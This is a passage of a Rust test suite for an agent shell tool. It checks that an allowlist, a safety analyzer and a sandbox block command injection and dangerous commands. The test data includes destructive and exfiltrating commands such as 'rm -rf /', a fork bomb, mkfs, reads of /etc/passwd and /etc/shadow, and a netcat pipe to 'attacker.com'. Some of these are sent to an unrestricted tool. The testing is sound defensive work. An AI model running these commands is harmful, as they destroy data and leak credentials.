        let tests = ShellToolComprehensiveTests::new();
        tests.test_error_invalid_field_type().await.unwrap();
    }

    #[tokio::test]
    async fn test_comprehensive_empty_string() {
        let tests = ShellToolComprehensiveTests::new();
        tests.test_edge_case_empty_string().await.unwrap();
    }

    #[tokio::test]
    async fn test_comprehensive_very_long_input() {
        let tests = ShellToolComprehensiveTests::new();
        tests.test_edge_case_very_long_input().await.unwrap();
    }

    #[tokio::test]
    async fn test_comprehensive_unicode_and_special_chars() {
        let tests = ShellToolComprehensiveTests::new();
        tests
            .test_edge_case_unicode_and_special_chars()
            .await
            .unwrap();
    }

    #[tokio::test]
    async fn test_comprehensive_null_values() {
        let tests = ShellToolComprehensiveTests::new();
        tests.test_edge_case_null_values().await.unwrap();
    }

    #[tokio::test]
    async fn test_comprehensive_repeated_calls() {
        let tests = ShellToolComprehensiveTests::new();
        tests.test_robustness_repeated_calls().await.unwrap();
    }

    #[tokio::test]
    async fn test_comprehensive_alternating_valid_invalid() {
        let tests = ShellToolComprehensiveTests::new();
        tests
            .test_robustness_alternating_valid_invalid()
            .await
            .unwrap();
    }

    // Shell-specific comprehensive tests

    #[tokio::test]
    async fn test_command_injection_attempt() {
        let tool = ShellTool::new();

        // Try various command injection patterns
        let injection_attempts = vec![
            "echo test; rm -rf /",
            "echo test && cat /etc/passwd",
            "echo test | nc attacker.com 1234",
            "$(whoami)",
            "`whoami`",
        ];

        for attempt in injection_attempts {
            let input = serde_json::json!({"command": attempt});
            // Tool may execute or reject - we just verify it doesn't panic
            let _ = tool._call(ToolInput::Structured(input)).await;
        }
    }

    #[tokio::test]
    async fn test_output_size_truncation() {
        let tool = ShellTool::new().with_max_output_bytes(100);

        // Generate large output (same command works on all OS)
        let input = serde_json::json!({"command": format!("echo {}", "A".repeat(1000))});

        let result = tool._call(ToolInput::Structured(input)).await.unwrap();

        // Output should be truncated
        assert!(result.contains("truncated") || result.len() <= 200);
    }

    #[tokio::test]
    async fn test_concurrent_command_execution() {
        let tool = ShellTool::new();

        // Spawn 5 concurrent commands
        let mut handles = vec![];

        for i in 0..5 {
            let tool_clone = tool.clone();
            let handle = tokio::spawn(async move {
                let input = serde_json::json!({"command": format!("echo test{}", i)});
                tool_clone._call(ToolInput::Structured(input)).await
            });
            handles.push(handle);
        }

        // All should complete successfully
        for handle in handles {
            let result = handle.await.unwrap();
            assert!(result.is_ok());
        }
    }

    #[tokio::test]
    async fn test_stderr_capture() {
        let tool = ShellTool::new();

        // Command that outputs to stderr
        let input = if cfg!(target_os = "windows") {
            serde_json::json!({"command": "echo error 1>&2"})
        } else {
            serde_json::json!({"command": "echo error >&2"})
        };

        let result = tool._call(ToolInput::Structured(input)).await.unwrap();

        // Should capture stderr
        assert!(result.contains("error") || result.contains("[stderr]"));
    }

    // ========================================================================
    // Security Tests (M-311: Shell tool security tests)
    // ========================================================================

    /// Test command injection via shell metacharacters is blocked when allowlist enabled
    #[tokio::test]
    async fn test_security_injection_semicolon_blocked() {
        let tool = ShellTool::new().with_allowed_commands(vec!["echo".to_string()]);

        // Semicolon command chaining should be blocked
        let input = serde_json::json!({"command": "echo safe; rm -rf /"});
        let result = tool._call(ToolInput::Structured(input)).await;

        assert!(result.is_err(), "Semicolon injection should be blocked");
        let err_msg = result.unwrap_err().to_string();
        assert!(
            err_msg.contains("metacharacter") || err_msg.contains("injection"),
            "Error should mention metacharacter: {}",
            err_msg
        );
    }

    /// Test command injection via pipe is blocked when allowlist enabled
    #[tokio::test]
    async fn test_security_injection_pipe_blocked() {
        let tool = ShellTool::new().with_allowed_commands(vec!["echo".to_string()]);

        // Pipe command chaining should be blocked
        let input = serde_json::json!({"command": "echo safe | cat /etc/passwd"});
        let result = tool._call(ToolInput::Structured(input)).await;

        assert!(result.is_err(), "Pipe injection should be blocked");
        assert!(
            result.unwrap_err().to_string().contains("metacharacter"),
            "Error should mention metacharacter"
        );
    }

    /// Test command injection via background operator blocked
    #[tokio::test]
    async fn test_security_injection_background_blocked() {
        let tool = ShellTool::new().with_allowed_commands(vec!["echo".to_string()]);

        // Background operator should be blocked
        let input = serde_json::json!({"command": "echo safe & malicious_command"});
        let result = tool._call(ToolInput::Structured(input)).await;

        assert!(
            result.is_err(),
            "Background operator injection should be blocked"
        );
    }

    /// Test command injection via backtick substitution blocked
    #[tokio::test]
    async fn test_security_injection_backtick_blocked() {
        let tool = ShellTool::new().with_allowed_commands(vec!["echo".to_string()]);

        // Backtick command substitution should be blocked
        let input = serde_json::json!({"command": "echo `whoami`"});
        let result = tool._call(ToolInput::Structured(input)).await;

        assert!(result.is_err(), "Backtick substitution should be blocked");
    }

    /// Test command injection via $() substitution blocked
    #[tokio::test]
    async fn test_security_injection_dollar_paren_blocked() {
        let tool = ShellTool::new().with_allowed_commands(vec!["echo".to_string()]);

        // $() command substitution should be blocked
        let input = serde_json::json!({"command": "echo $(whoami)"});
        let result = tool._call(ToolInput::Structured(input)).await;

        assert!(result.is_err(), "$() substitution should be blocked");
        assert!(
            result.unwrap_err().to_string().contains("$("),
            "Error should mention $( pattern"
        );
    }

    /// Test command injection via ${} variable expansion blocked
    #[tokio::test]
    async fn test_security_injection_dollar_brace_blocked() {
        let tool = ShellTool::new().with_allowed_commands(vec!["echo".to_string()]);

        // ${} variable expansion should be blocked
        let input = serde_json::json!({"command": "echo ${PATH}"});
        let result = tool._call(ToolInput::Structured(input)).await;

        assert!(result.is_err(), "${{}} expansion should be blocked");
    }

    /// Test command injection via && operator blocked
    #[tokio::test]
    async fn test_security_injection_and_operator_blocked() {
        let tool = ShellTool::new().with_allowed_commands(vec!["echo".to_string()]);

        // && operator should be blocked
        let input = serde_json::json!({"command": "echo safe && malicious_command"});
        let result = tool._call(ToolInput::Structured(input)).await;

        assert!(result.is_err(), "&& operator should be blocked");
    }

    /// Test command injection via || operator blocked
    #[tokio::test]
    async fn test_security_injection_or_operator_blocked() {
        let tool = ShellTool::new().with_allowed_commands(vec!["echo".to_string()]);

        // || operator should be blocked
        let input = serde_json::json!({"command": "echo safe || malicious_command"});
        let result = tool._call(ToolInput::Structured(input)).await;

        assert!(result.is_err(), "|| operator should be blocked");
    }

    /// Test command injection via newline blocked
    #[tokio::test]
    async fn test_security_injection_newline_blocked() {
        let tool = ShellTool::new().with_allowed_commands(vec!["echo".to_string()]);

        // Newline command injection should be blocked
        let input = serde_json::json!({"command": "echo safe\nmalicious_command"});
        let result = tool._call(ToolInput::Structured(input)).await;

        assert!(result.is_err(), "Newline injection should be blocked");
    }

    /// Test command injection via carriage return blocked
    #[tokio::test]
    async fn test_security_injection_carriage_return_blocked() {
        let tool = ShellTool::new().with_allowed_commands(vec!["echo".to_string()]);

        // Carriage return command injection should be blocked
        let input = serde_json::json!({"command": "echo safe\rmalicious_command"});
        let result = tool._call(ToolInput::Structured(input)).await;

        assert!(
            result.is_err(),
            "Carriage return injection should be blocked"
        );
    }

    /// Test that disallowed command is blocked by allowlist
    #[tokio::test]
    async fn test_security_disallowed_command_blocked() {
        let tool = ShellTool::new().with_allowed_commands(vec!["echo".to_string()]);

        // rm command not in allowlist
        let input = serde_json::json!({"command": "rm -rf /tmp/test"});
        let result = tool._call(ToolInput::Structured(input)).await;

        assert!(result.is_err(), "Disallowed command should be blocked");
        assert!(
            result
                .unwrap_err()
                .to_string()
                .contains("not in allowed list"),
            "Error should indicate command not allowed"
        );
    }

    /// Test prefix bypass attempt is blocked
    #[tokio::test]
    async fn test_security_prefix_bypass_blocked() {
        let tool = ShellTool::new().with_allowed_prefixes(vec!["git ".to_string()]);

        // Try to bypass by prefixing allowed command with dangerous one
        // Note: "git status; rm" would be caught by metacharacter check
        let input = serde_json::json!({"command": "git status; rm -rf /"});
        let result = tool._call(ToolInput::Structured(input)).await;

        assert!(result.is_err(), "Prefix bypass attempt should be blocked");
    }

    /// Test command that doesn't match prefix is blocked
    #[tokio::test]
    async fn test_security_prefix_mismatch_blocked() {
        let tool = ShellTool::new().with_allowed_prefixes(vec!["git ".to_string()]);

        // Command doesn't start with allowed prefix
        let input = serde_json::json!({"command": "rm -rf /"});
        let result = tool._call(ToolInput::Structured(input)).await;

        assert!(
            result.is_err(),
            "Command without allowed prefix should be blocked"
        );
        assert!(
            result.unwrap_err().to_string().contains("must start with"),
            "Error should indicate prefix requirement"
        );
    }

    /// Test SafeShellTool blocks forbidden commands
    #[tokio::test]
    async fn test_security_safe_shell_forbidden_blocked() {
        let tool = SafeShellTool::restrictive();

        // Fork bomb pattern should be forbidden
        let input = serde_json::json!({"command": ":(){ :|:& };:"});
        let result = tool._call(ToolInput::Structured(input)).await;

        assert!(result.is_err(), "Fork bomb should be forbidden");
        assert!(
            result.unwrap_err().to_string().contains("forbidden"),
            "Error should indicate forbidden status"
        );
    }

    /// Test SafeShellTool blocks rm -rf /
    #[tokio::test]
    async fn test_security_safe_shell_rm_rf_root_blocked() {
        let tool = SafeShellTool::restrictive();

        let input = serde_json::json!({"command": "rm -rf /"});
        let result = tool._call(ToolInput::Structured(input)).await;

        assert!(result.is_err(), "rm -rf / should be forbidden");
    }

    /// Test SafeShellTool blocks mkfs
    #[tokio::test]
    async fn test_security_safe_shell_mkfs_blocked() {
        let tool = SafeShellTool::restrictive();

        let input = serde_json::json!({"command": "mkfs.ext4 /dev/sda1"});
        let result = tool._call(ToolInput::Structured(input)).await;

        assert!(result.is_err(), "mkfs should be forbidden");
    }

    /// Test SafeShellTool detects dangerous sudo commands
    #[tokio::test]
    async fn test_security_safe_shell_sudo_detected() {
        let tool = SafeShellTool::restrictive();

        // Analyze sudo command
        let analysis = tool.analyze("sudo rm -rf /tmp");
        assert!(
            analysis.modifies_system,
            "sudo should be detected as system modification"
        );
        assert!(
            analysis.severity >= Severity::Dangerous,
            "sudo should be at least dangerous"
        );
    }

    /// Test SafeShellTool detects network access
    #[tokio::test]
    async fn test_security_safe_shell_network_detected() {
        let tool = SafeShellTool::restrictive();

        // curl should be detected as network access
        let analysis = tool.analyze("curl https://example.com");
        assert!(
            analysis.accesses_network,
            "curl should be detected as network access"
        );
    }

    /// Test SafeShellTool detects filesystem modification
    #[tokio::test]
    async fn test_security_safe_shell_fs_modify_detected() {
        let tool = SafeShellTool::restrictive();

        // rm should be detected as filesystem modification
        let analysis = tool.analyze("rm -rf /tmp/test");
        assert!(
            analysis.modifies_filesystem,
            "rm should be detected as filesystem modification"
        );

        // touch should be detected as filesystem modification
        let analysis = tool.analyze("touch /tmp/newfile");
        assert!(
            analysis.modifies_filesystem,
            "touch should be detected as filesystem modification"
        );
    }

    /// Test approval callback blocks unapproved commands
    #[tokio::test]
    async fn test_security_approval_callback_blocks() {
        use std::sync::Arc;

        let tool =
            SafeShellTool::permissive().with_approval_callback(Arc::new(|_cmd, severity| {
                // Block anything dangerous or above
                severity < Severity::Dangerous
            }));

        // sudo is dangerous, should be blocked by callback
        let input = serde_json::json!({"command": "sudo ls"});
        let result = tool._call(ToolInput::Structured(input)).await;

        assert!(
            result.is_err(),
            "Dangerous command should be blocked by callback"
        );
        assert!(
            result.unwrap_err().to_string().contains("not approved"),
            "Error should indicate command not approved"
        );
    }

    // ========================================================================
    // Quoting Edge Cases
    // ========================================================================

    /// Test command with single quotes doesn't panic
    #[tokio::test]
    async fn test_security_quoting_single_quotes_no_panic() {
        let tool = ShellTool::new();
        let input = serde_json::json!({"command": "echo 'hello world'"});
        let _ = tool._call(ToolInput::Structured(input)).await;
        // No panic = success
    }

    /// Test command with double quotes doesn't panic
    #[tokio::test]
    async fn test_security_quoting_double_quotes_no_panic() {
        let tool = ShellTool::new();
        let input = serde_json::json!({"command": "echo \"hello world\""});
        let _ = tool._call(ToolInput::Structured(input)).await;
    }

    /// Test command with mixed quotes doesn't panic
    #[tokio::test]
    async fn test_security_quoting_mixed_quotes_no_panic() {
        let tool = ShellTool::new();
        let input = serde_json::json!({"command": "echo \"it's a test\""});
        let _ = tool._call(ToolInput::Structured(input)).await;
    }

    /// Test command with escaped characters doesn't panic
    #[tokio::test]
    async fn test_security_quoting_escaped_chars_no_panic() {
        let tool = ShellTool::new();
        let input = serde_json::json!({"command": "echo \\\"escaped\\\""});
        let _ = tool._call(ToolInput::Structured(input)).await;
    }

    /// Test command with unbalanced quotes doesn't panic
    #[tokio::test]
    async fn test_security_quoting_unbalanced_no_panic() {
        let tool = ShellTool::new();

        // Unbalanced single quote
        let input1 = serde_json::json!({"command": "echo 'unbalanced"});
        let _ = tool._call(ToolInput::Structured(input1)).await;

        // Unbalanced double quote
        let input2 = serde_json::json!({"command": "echo \"unbalanced"});
        let _ = tool._call(ToolInput::Structured(input2)).await;
    }

    /// Test command with backslash sequences doesn't panic
    #[tokio::test]
    async fn test_security_quoting_backslash_sequences_no_panic() {
        let tool = ShellTool::new();

        let sequences = vec![
            "echo \\n",
            "echo \\t",
            "echo \\\\",
            "echo \\a\\b\\c",
            "echo '\\n'",
        ];

        for cmd in sequences {
            let input = serde_json::json!({"command": cmd});
            let _ = tool._call(ToolInput::Structured(input)).await;
        }
    }

    // ========================================================================
    // Fuzz-like No-Panic Tests (malicious input)
    // ========================================================================

    /// Test empty command doesn't panic
    #[tokio::test]
    async fn test_security_fuzz_empty_command() {
        let tool = ShellTool::new();
        let input = serde_json::json!({"command": ""});
        let _ = tool._call(ToolInput::Structured(input)).await;
    }

    /// Test whitespace-only command doesn't panic
    #[tokio::test]
    async fn test_security_fuzz_whitespace_command() {
        let tool = ShellTool::new();

        let whitespace_inputs = vec!["   ", "\t\t", "\n\n", "  \t  \n  "];
        for ws in whitespace_inputs {
            let input = serde_json::json!({"command": ws});
            let _ = tool._call(ToolInput::Structured(input)).await;
        }
    }

    /// Test extremely long command doesn't panic
    #[tokio::test]
    async fn test_security_fuzz_very_long_command() {
        let tool = ShellTool::new().with_timeout(2);

        // Create a very long command (100KB)
        let long_arg = "A".repeat(100_000);
        let input = serde_json::json!({"command": format!("echo {}", long_arg)});
        let _ = tool._call(ToolInput::Structured(input)).await;
    }

    /// Test null bytes in command don't panic
    #[tokio::test]
    async fn test_security_fuzz_null_bytes() {
        let tool = ShellTool::new().with_allowed_commands(vec!["echo".to_string()]);

        let input = serde_json::json!({"command": "echo hello\x00world"});
        let _ = tool._call(ToolInput::Structured(input)).await;
    }

    /// Test unicode in command doesn't panic
    #[tokio::test]
    async fn test_security_fuzz_unicode() {
        let tool = ShellTool::new();

        let unicode_inputs = vec![
            "echo 你好世界",
            "echo مرحبا",
            "echo 🔥💀☠️",
            "echo Здравствуй мир",
            "echo \u{202e}reversed", // right-to-left override
        ];

        for cmd in unicode_inputs {
            let input = serde_json::json!({"command": cmd});
            let _ = tool._call(ToolInput::Structured(input)).await;
        }
    }

    /// Test control characters don't panic
    #[tokio::test]
    async fn test_security_fuzz_control_chars() {
        let tool = ShellTool::new().with_allowed_commands(vec!["echo".to_string()]);

        // Various control characters (these may be blocked or fail, but shouldn't panic)
        let control_inputs = vec![
            "echo \x01\x02\x03",       // SOH, STX, ETX
            "echo \x07",               // BEL
            "echo \x08",               // BS
            "echo \x1b[31mred\x1b[0m", // ANSI escape
            "echo \x7f",               // DEL
        ];

        for cmd in control_inputs {
            let input = serde_json::json!({"command": cmd});
            let _ = tool._call(ToolInput::Structured(input)).await;
        }
    }

    /// Test special shell characters don't panic
    #[tokio::test]
    async fn test_security_fuzz_special_shell_chars() {
        let tool = ShellTool::new();

        // These may fail but shouldn't panic
        let special_inputs = vec![
            "echo $", "echo $$", "echo $?", "echo $!", "echo $@", "echo $*", "echo $#", "echo ~",
            "echo *", "echo ?", "echo [", "echo ]", "echo {", "echo }", "echo #", "echo !",
            "echo %", "echo ^",
        ];

        for cmd in special_inputs {
            let input = serde_json::json!({"command": cmd});
            let _ = tool._call(ToolInput::Structured(input)).await;
        }
    }

    /// Test malformed shell constructs don't panic
    #[tokio::test]
    async fn test_security_fuzz_malformed_constructs() {
        let tool = ShellTool::new();

        let malformed_inputs = vec![
            "echo $(",  // unclosed $(
            "echo ${",  // unclosed ${
            "echo `",   // single backtick
            "echo $((", // nested unclosed
            "echo <<<", // here-string without content
            "echo >>",  // redirect without target
            "echo <",   // input redirect without source
            "echo 2>&", // redirect without fd
        ];

        for cmd in malformed_inputs {
            let input = serde_json::json!({"command": cmd});
            let _ = tool._call(ToolInput::Structured(input)).await;
        }
    }

    /// Test path-like commands don't panic
    #[tokio::test]
    async fn test_security_fuzz_path_like_commands() {
        let tool = ShellTool::new();

        let path_inputs = vec![
            "../../../etc/passwd",
            "/dev/null",
            "/dev/zero",
            "/proc/self/environ",
            "~/../../../etc/shadow",
            "/etc/passwd%00.txt",
        ];

        for cmd in path_inputs {
            let input = serde_json::json!({"command": cmd});
            let _ = tool._call(ToolInput::Structured(input)).await;
        }
    }

    /// Test rapid sequential commands don't panic
    #[tokio::test]
    async fn test_security_fuzz_rapid_commands() {
        let tool = ShellTool::new().with_timeout(1);

        for i in 0..20 {
            let input = serde_json::json!({"command": format!("echo {}", i)});
            let _ = tool._call(ToolInput::Structured(input)).await;
        }
    }

    /// Test concurrent malicious commands don't panic
    #[tokio::test]
    async fn test_security_fuzz_concurrent_malicious() {
        let tool = ShellTool::new().with_allowed_commands(vec!["echo".to_string()]);

        let malicious_commands = vec![
            "rm -rf /",
            "echo safe; rm -rf /",
            "$(whoami)",
            "echo `id`",
            "cat /etc/passwd",
        ];

        let mut handles = vec![];
        for cmd in malicious_commands {
            let tool_clone = tool.clone();
            let cmd_owned = cmd.to_string();
            let handle = tokio::spawn(async move {
                let input = serde_json::json!({"command": cmd_owned});
                tool_clone._call(ToolInput::Structured(input)).await
            });
            handles.push(handle);
        }

        // All should complete (either success or error) without panic
        for handle in handles {
            let result = handle.await;
            assert!(result.is_ok(), "Task should not panic");
        }
    }

    // ========================================================================
    // Sandbox Security Tests
    // ========================================================================

    /// Test SandboxedShellTool blocks forbidden commands
    #[tokio::test]
    async fn test_security_sandbox_forbidden_blocked() {
        let tool = SandboxedShellTool::builder()
            .sandbox_mode(SandboxMode::Disabled) // Focus on safety analysis, not OS sandbox
            .build()
            .unwrap();

        // rm -rf / should be blocked by safety analysis
        let result = tool.execute("rm -rf /").await;
        assert!(result.is_err(), "Sandbox should block rm -rf /");
        assert!(
            result.unwrap_err().to_string().contains("forbidden"),
            "Error should indicate forbidden command"
        );
    }

    /// Test SandboxedShellTool blocks fork bomb
    #[tokio::test]
    async fn test_security_sandbox_fork_bomb_blocked() {
        let tool = SandboxedShellTool::builder()
            .sandbox_mode(SandboxMode::Disabled)
            .build()
            .unwrap();

        let result = tool.execute(":(){ :|:& };:").await;
        assert!(result.is_err(), "Sandbox should block fork bomb");
    }

    /// Test SandboxedShellTool analyze_only mode
    #[tokio::test]
    async fn test_security_sandbox_analyze_only_mode() {
        let tool = SandboxedShellTool::builder()
            .sandbox_mode(SandboxMode::Disabled)
            .build()
            .unwrap();

        // analyze_only should return analysis without execution
        let input = serde_json::json!({
            "command": "rm -rf /",
            "analyze_only": true
        });
        let result = tool._call(ToolInput::Structured(input)).await;

        // Should succeed and return analysis
        assert!(
            result.is_ok(),
            "analyze_only should succeed even for dangerous commands"
        );
        let output = result.unwrap();
        assert!(output.contains("forbidden") || output.contains("Forbidden"));
    }

    /// Test SandboxedShellTool with strict mode and permissive fallback
    #[tokio::test]
    async fn test_security_sandbox_strict_with_fallback() {
        // This should work even without OS sandbox due to fallback
        let tool = SandboxedShellTool::builder()
            .sandbox_mode(SandboxMode::Strict)
            .on_sandbox_missing(SandboxFallback::Warn)
            .build()
            .unwrap();

        // Safe command should work
        let result = tool.execute("echo hello").await;
        assert!(result.is_ok(), "Safe command should work with fallback");
    }

    /// Test SandboxedShellTool writable_roots has effect on analysis
    #[tokio::test]
    async fn test_security_sandbox_writable_roots() {
        let tool = SandboxedShellTool::builder()
            .sandbox_mode(SandboxMode::Disabled)
            .writable_roots(vec![std::path::PathBuf::from("/tmp")])
            .build()
            .unwrap();

        let roots = tool.writable_roots();
        assert_eq!(roots.len(), 1);
        assert_eq!(roots[0], std::path::PathBuf::from("/tmp"));
    }

    // ========================================================================
    // Safety Analysis Tests
    // ========================================================================

    /// Test CommandAnalyzer detects compound commands
    #[test]
    fn test_security_analyzer_compound_commands() {
        let analyzer = CommandAnalyzer::restrictive();

        // Should detect both commands in compound
        let result = analyzer.analyze("ls && rm -rf /");
        assert_eq!(result.severity, Severity::Forbidden);
        assert!(
            result.commands.len() >= 2,
            "Should extract multiple commands"
        );
    }

    /// Test CommandAnalyzer detects command substitution
    #[test]
    fn test_security_analyzer_command_substitution() {
        let analyzer = CommandAnalyzer::restrictive();

        // $() substitution
        let result = analyzer.analyze("echo $(rm -rf /)");
        assert_eq!(result.severity, Severity::Forbidden);

        // backtick substitution
        let result = analyzer.analyze("echo `rm -rf /`");
        assert_eq!(result.severity, Severity::Forbidden);
    }

    /// Test CommandAnalyzer safe_commands config works
    #[test]
    fn test_security_analyzer_safe_commands() {
        let config = SafetyConfig::restrictive().with_safe_commands(vec!["mycommand".to_string()]);
        let analyzer = CommandAnalyzer::new(config);

        let result = analyzer.analyze("mycommand --arg");
        assert_eq!(result.severity, Severity::Safe);
    }

    /// Test CommandAnalyzer custom forbidden patterns
    #[test]
    fn test_security_analyzer_custom_forbidden() {
        let config =
            SafetyConfig::permissive().with_forbidden_patterns(vec![r"dangerous".to_string()]);
        let analyzer = CommandAnalyzer::new(config);

        let result = analyzer.analyze("dangerous-command");
        assert_eq!(result.severity, Severity::Forbidden);
    }

    /// Test Severity ordering
    #[test]
    fn test_security_severity_ordering() {
        assert!(Severity::Safe < Severity::Unknown);
        assert!(Severity::Unknown < Severity::Dangerous);
        assert!(Severity::Dangerous < Severity::Forbidden);
    }
}
